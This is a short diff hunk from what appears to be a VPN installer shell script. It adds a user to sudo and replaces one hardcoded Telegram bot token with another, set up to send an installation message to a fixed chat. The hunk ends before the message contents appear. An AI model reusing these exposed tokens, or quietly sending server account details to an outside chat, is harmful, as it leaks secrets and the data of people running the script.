@@ -382,7 +382,7 @@ function password_default() {
     usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="6127364024"
-    KEY="6249930085:AAH3Pha4vhjM3js03LA9R2alMBBgic0eI58"
+    KEY="6448022205:AAFaPYRv83bUeupOWfvbCjVmY0S-ZAWaKjM"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Installasi VPN Script Stable V3.0
